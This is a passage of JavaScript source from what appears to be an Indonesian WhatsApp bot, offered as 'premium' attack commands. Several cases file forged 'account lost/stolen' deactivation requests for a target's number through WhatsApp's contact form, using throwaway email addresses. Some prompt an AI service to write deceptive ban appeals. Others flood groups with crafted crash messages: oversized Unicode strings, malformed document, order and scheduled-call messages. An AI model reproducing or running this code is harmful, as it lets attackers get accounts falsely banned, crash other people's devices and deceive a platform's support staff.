form.append("your_message", `Mohon untuk segera menonaktifkan akun saya karena telah hilang/dicuri, sebelum akun WhatsApp saya direbut oleh pihak yang tidak bertanggung jawab.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
zetsreply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
zetsreply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
zetsreply(`Sedang Limit Tunggu Beberapa Saat.`)
zetsreply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Targetnya Sayang\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
case 'verify': case 'jeb0l': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
if (Input) {
let cekno = await zetsubo.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bego-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Mohon untuk segera menonaktifkan akun saya yang hilang/dicuri.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
zetsreply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
zetsreply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
zetsreply(`Sedang Limit Tunggu Beberapa Saat.`)
zetsreply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Targetnya Sayang\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
case 'resetotp': {
if (!isCreator) return reply('*Premium Command*')
await loading()
if (Input) {
let cekno = await zetsubo.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bego-_#`)
if (Input == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${restotp}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
zetsreply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
zetsreply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
zetsreply(`Sedang Limit Tunggu Beberapa Saat.`)
zetsreply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Targetnya Sayang\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================
case 'createunban1': case 'textunban1': {
if (!isCreator) return reply(`Lu Bukan Owner/Premium`)
await loading()
var createu = `Openai Buatkan Text Laporan Untuk Mengatasi Akun WhatsApp Yang Diblokir Permanen

Catatan:
- Batasan Jumlah karakter: Laporan harus memiliki jumlah karakter maksimal sebanyak 950. Dalam usaha untuk mencapai tujuan ini, disarankan agar laporan dibuat dengan singkat dan padat.

- Batasan Jumlah Paragraf: Laporan tidak boleh melebihi tiga paragraf. Hal ini bertujuan untuk menjaga agar laporan tetap terfokus dan tidak panjang.

- Gaya Penulisan: Hindari menggunakan gaya penulisan formal dalam laporan. Sebaiknya gunakan bahasa yang lebih sederhana dan mudah dimengerti oleh pembaca dan hindari penggunaan Salam Pembuka Dan Salam Penutup Agar Teks Laporan Menjadi Pendek.

- Inti laporan: Harap fokus pada poin-poin penting, seperti pembahasan mengenai pemulihan akun WhatsApp tanpa perlu berbelit-belit.

- Sisipkan kata-kata yang kuat dalam laporan Untuk Meyakinkan Pihak WhatsApp Seperti :

[Harus memiliki subjek judul untuk setiap teks]

beberapa pesan penting dalam grup WhatsApp sekolah (untuk pengguna yang merupakan pelajar), yang mencakup pembelajaran, komunikasi dengan keluarga yang jauh, pekerjaan sampingan, dan banyak hal positif lainnya. Jika ada tuduhan bahwa pengguna telah melanggar ketentuan WhatsApp, maka perlu ditekankan bahwa tuduhan tersebut mungkin berasal dari seseorang yang tidak senang atau iri terhadap pengguna.

diharapkan laporan yang disusun dapat dibuat lebih pendek, efektif, dan mudah dipahami.`
var js = await fetch(`https://aemt.me/openai-db?user=1&text=${createu}`) 
 var json = await js.json()
zetsreply(`~*Nih Teks Unbannya Bang*~: 

${json.result}

~*Usahakan Untuk Meringkas Teks Diatas Sebelum Dipakai*~`)
}
break
case 'createunban2': case 'textunban2': {
await loading()
var createu = `Buatkan Text Laporan Untuk Mengatasi Akun WhatsApp Yang Diblokir Permanen

Catatan:
- Batasan Jumlah karakter: Laporan harus memiliki jumlah karakter maksimal sebanyak 950. Dalam usaha untuk mencapai tujuan ini, disarankan agar laporan dibuat dengan singkat dan padat.

- Batasan Jumlah Paragraf: Laporan tidak boleh melebihi tiga paragraf. Hal ini bertujuan untuk menjaga agar laporan tetap terfokus dan tidak panjang.

- Gaya Penulisan: Hindari menggunakan gaya penulisan formal dalam laporan. Sebaiknya gunakan bahasa yang lebih sederhana dan mudah dimengerti oleh pembaca dan hindari penggunaan Salam Pembuka Dan Salam Penutup Agar Teks Laporan Menjadi Lebih Pendek.

- Inti laporan: Harap fokus pada poin-poin penting, seperti pembahasan mengenai pemulihan akun WhatsApp tanpa perlu berbelit-belit.

- Sisipkan kata-kata yang kuat dalam laporan Untuk Meyakinkan Pihak WhatsApp Seperti :

[Harus memiliki subjek judul untuk setiap teks]

Salam, (opsional)

Ucapan Maaf karena telah mengganggu kenyamanan tim dukungan WhatsApp

• Nomor WhatsApp Pengguna (Pengirim Laporan) Telah Diblokir dan tidak dapat menggunakan WhatsApp.
• Pengguna (Pengirim Laporan) Meminta Bantuan Kepada Tim WhatsApp Untuk Memulihkan Akun WhatsApp Nya.
• Pengguna (Pengirim Laporan) Mengklarifikasikan Bahwa Pengguna (Pengirim Laporan) dengan tulus mematuhi semua ketentuan dan kebijakan yang ditetapkan oleh WhatsApp, dan Pengguna (Pengirim Laporan) tidak pernah menggunakan akun tersebut untuk melakukan pelanggaran apapun.
• Pengguna (Pengirim Laporan) Juga Mengatakan, jika ada tuduhan bahwa Pengguna (Pengirim Laporan) telah melanggar ketentuan WhatsApp, Pengguna (Pengirim Laporan) meyakini bahwa tuduhan tersebut adalah ulah dari seseorang yang mungkin tidak senang atau iri terhadap pengguna.
• Pengguna (Pengirim Laporan) memohon kepada tim dukungan WhatsApp untuk membatalkan pemblokiran akun nya

• Akun Terkait Pengguna (Pengirim Laporan) : `
var js = await fetch(`https://aemt.me/openai-db?user=1&text=${createu}`) 
 var json = await js.json()
zetsreply(`~*Nih Teks Unbannya Bang*~: 

${json.result}

~*Usahakan Untuk Meringkas Teks Diatas Sebelum Dipakai*~`)
}
break
case 'createunban3': case 'textunban3': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
var createu = `Openai Buatkan Text Laporan Untuk Mengatasi Akun WhatsApp Yang Diblokir Permanen

Catatan:
- Batasan Jumlah karakter: Laporan harus memiliki jumlah karakter maksimal sebanyak 950. Dalam usaha untuk mencapai tujuan ini, disarankan agar laporan dibuat dengan singkat dan padat.

- Batasan Jumlah Paragraf: Laporan tidak boleh melebihi tiga paragraf. Hal ini bertujuan untuk menjaga agar laporan tetap terfokus dan tidak panjang.

- Gaya Penulisan: Hindari menggunakan gaya penulisan formal dalam laporan. Sebaiknya gunakan bahasa yang lebih sederhana dan mudah dimengerti oleh pembaca dan hindari penggunaan Salam Pembuka Dan Salam Penutup Agar Teks Laporan Menjadi Pendek.

- Inti laporan: Harap fokus pada poin-poin penting, seperti pembahasan mengenai pemulihan akun WhatsApp tanpa perlu berbelit-belit.

- Sisipkan kata-kata yang kuat dalam laporan Untuk Meyakinkan Pihak WhatsApp Seperti :

Salam, (opsional)

Ucapan Maaf karena telah mengganggu kenyamanan tim dukungan WhatsApp

• Nomor WhatsApp Pengguna (Pengirim Laporan) Telah Diblokir dan tidak dapat menggunakan WhatsApp.
• Pengguna (Pengirim Laporan) tersebut menyatakan bahwa akun ini digunakan untuk melaksanakan kegiatan sehari-hari, dengan tujuan utama untuk menerima informasi terkini mengenai istri Pengguna (Pengirim Laporan) yang sedang hamil dan dalam masa kehamilan selama delapan bulan.
• Pengguna (Pengirim Laporan) tidak dapat memulihkan akunnya dikarenakan blokir permanen.
• Pengguna (Pengirim Laporan) menceritakan bahwa Pengguna (Pengirim Laporan) telah memberitahu temannya dan rekan kerjanya tentang akun whatsapp Pengguna (Pengirim Laporan) yang diblokir. Pengguna (Pengirim Laporan) sudah melakukan prosedur yang teman Dan rekannya berikan,Dan juga Pengguna (Pengirim Laporan) sempat mencoba yang dia temukan di internet,Namun Hasilnya Nihil.sampai saat ini akun Pengguna (Pengirim Laporan) masih diblokir.
• Pengguna (Pengirim Laporan) Meminta Bantuan Kepada Tim WhatsApp Untuk Memulihkan Akun WhatsApp Nya.
• Pengguna (Pengirim Laporan) Memberi Tahu bahwa Pengguna (Pengirim Laporan) sendiri tidak mengetahui kesalahan Apa yang dia lakukan di whatsapp hingga Pengguna (Pengirim Laporan) diblokir.
• Pengguna (Pengirim Laporan) Mengklarifikasikan Bahwa Pengguna (Pengirim Laporan) dengan tulus mematuhi semua ketentuan dan kebijakan yang ditetapkan oleh WhatsApp, dan Pengguna (Pengirim Laporan) tidak pernah menggunakan akun tersebut untuk melakukan pelanggaran apapun.
• Pengguna (Pengirim Laporan) Juga Mengatakan, jika ada tuduhan bahwa Pengguna (Pengirim Laporan) telah melanggar ketentuan WhatsApp, Pengguna (Pengirim Laporan) meyakini bahwa tuduhan tersebut adalah ulah dari seseorang yang mungkin tidak senang atau iri terhadap pengguna.
• Pengguna (Pengirim Laporan) memohon kepada tim dukungan WhatsApp untuk membatalkan pemblokiran akun nya

• Akun Terkait Pengguna (Pengirim Laporan) :`
var js = await fetch(`https://aemt.me/openai-db?user=1&text=${createu}`) 
 var json = await js.json()
zetsreply(`~*Nih Teks Unbannya Bang*~: 

${json.result}

~*Usahakan Untuk Meringkas Teks Diatas Sebelum Dipakai*~`)
}
break
case 'createunban4': case 'textunban4': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
var createu = `Openai Buatkan Text Laporan Untuk Mengatasi Akun WhatsApp Yang Diblokir Permanen

Catatan:
- Batasan Jumlah karakter: Laporan harus memiliki jumlah karakter maksimal sebanyak 950. Dalam usaha untuk mencapai tujuan ini, disarankan agar laporan dibuat dengan singkat dan padat.

- Batasan Jumlah Paragraf: Laporan tidak boleh melebihi tiga paragraf. Hal ini bertujuan untuk menjaga agar laporan tetap terfokus dan tidak panjang.

- Gaya Penulisan: Hindari menggunakan gaya penulisan formal dalam laporan. Sebaiknya gunakan bahasa yang lebih sederhana dan mudah dimengerti oleh pembaca dan hindari penggunaan Salam Pembuka Dan Salam Penutup Agar Teks Laporan Menjadi Pendek.

- Inti laporan: Harap fokus pada poin-poin penting, seperti pembahasan mengenai pemulihan akun WhatsApp tanpa perlu berbelit-belit.

- Sisipkan kata-kata yang kuat dalam laporan Untuk Meyakinkan Pihak WhatsApp Seperti :

Salam, (opsional)

Ucapan Maaf karena telah mengganggu kenyamanan tim dukungan WhatsApp

• Pengguna/Kami (Pengirim Laporan) Ingin menyampaikan keluhan terkait penangguhan akun penggunaan rumah sakit yang dianggap tidak adil. Dengan ini, Pengguna/Kami (Pengirim Laporan) ingin menegaskan bahwa akun penggunaan eksklusif Pengguna/Kami (Pengirim Laporan)  untuk perawatan rumah sakit telah dilarang secara tidak benar. Pengguna/Kami (Pengirim Laporan) sangat berharap agar masalah ini segera ditangani dengan serius dan memberikan tanggapan yang memadai.
• Pengguna/Kami (Pengirim Laporan) tersebut menyatakan bahwa Pengguna/Kami (Pengirim Laporan) merasa perlu menekankan bahwa akun penggunaan eksklusif untuk rumah sakit sangat penting dalam memberikan pelayanan kesehatan yang berkualitas kepada pasiennya. Penangguhan ini telah mengganggu operasional Pengguna/Kami (Pengirim Laporan) dan berpotensi membahayakan kesejahteraan pasien yang membutuhkan perawatan rumah sakit.
• Pengguna/Kami (Pengirim Laporan) tidak dapat memulihkan akunnya dikarenakan blokir permanen.
• Pengguna/Kami (Pengirim Laporan) Memberi Tahu bahwa Pengguna/Kami (Pengirim Laporan) sendiri tidak mengetahui kesalahan Apa yang dia lakukan di whatsapp hingga Pengguna/Kami (Pengirim Laporan) diblokir.
• Pengguna/Kami (Pengirim Laporan) Juga Mengatakan, jika ada tuduhan bahwa Pengguna/Kami (Pengirim Laporan) telah melanggar ketentuan WhatsApp, Pengguna/Kami (Pengirim Laporan) meyakini bahwa tuduhan tersebut adalah ulah dari seseorang yang mungkin tidak senang atau iri terhadap pengguna.
• Pengguna/Kami (Pengirim Laporan) Meminta Bantuan Kepada Tim WhatsApp Untuk Memulihkan Akun WhatsApp Nya.

• Akun Terkait Pengguna/Kami (Pengirim Laporan) :`
var js = await fetch(`https://aemt.me/openai-db?user=1&text=${createu}`) 
 var json = await js.json()
zetsreply(`~*Nih Teks Unbannya Bang*~: 

${json.result}

~*Usahakan Untuk Meringkas Teks Diatas Sebelum Dipakai*~`)
}
break

case "ai": case "chatgpt": case "openai": {
if (!text) return reply (`Example : ${prefix + command} create code html & css for hack NASA`)
var js = await fetch(`https://aemt.me/openai?text=${q}`) 
var json = await js.json()
zetsreply(json.result)
}
break
//=================================================
case 'bug?': case 'classic': case 'king': case 'oke': case 'fear': case 'virtex': case 'virteks': case 'virtext': case 'pirtek': case 'pirteks': case 'pirtex': case 'anjay':{
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')	
zetsubo.sendMessage(m.chat, { text: `★彡 𝑺𝑼𝑹𝑷𝑹𝑰𝑺𝑬𝑫 𝑯𝑼𝑯?彡★`}, { quoted: qbug })
}
break
  //=================================================
case 'classic-react': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
if (!m.quoted) return reply(`Penggunaan .${command} reply pesan`)
await zetsubo.sendMessage(m.chat, { text: 'success 💀', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(10000), serverMessageId: 2 } }}, { quoted: qbug })
await sleep(20000)
await zetsubo.sendMessage(m.chat, { react: { text: '🐬', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
//===========================================		
case 'docugc': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289503267904`)
bnnd = text.split("|")[0]+'@g.us'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓⧉⸙⫺",
"title": "༐༑⿻𝐒᪣𝐀⚔𝐌𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Zetsubo - Console V1.${bugui}`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ༐༑⿻𝐒᪣𝐀⚔𝐌𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑.${buttonkal}`,
}
}), { userJid: from, quoted:kalgans})
zetsubo.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
}
break
//=================================================//
case 'troligc': {
if (!isCreator) return reply('*Premium Command*')
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289503267904`)
bnnd = text.split("|")[0]+'@g.us'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${botname}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6289503267904@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : m})
zetsubo.relayMessage(bnnd, order.message, { messageId: order.key.id })
}
reply(`*Classic-V3 has Delivered  ${bnnd} Kindly wait for 3 minutes*`)
}
break
//=================================================//
case 'xgroup' : case 'Classicbreak' : case 'zetsinternal' : case 'buggcv' : case 'buggcw' : case 'buggcx' : case 'buggcy' : case 'buggcz' : case 'attentionv' : case 'attentionw' : case 'attentionz' : case 'gasfullgc' : {
 if (!isCreator) return reply('*Premium Allowed*')
 await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgroup = await zetsubo.groupAcceptInvite(result)
attention = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(rumgroup, schedule.message, { messageId: schedule.key.id })
	}
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=Cᚔl≽a࿉ ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
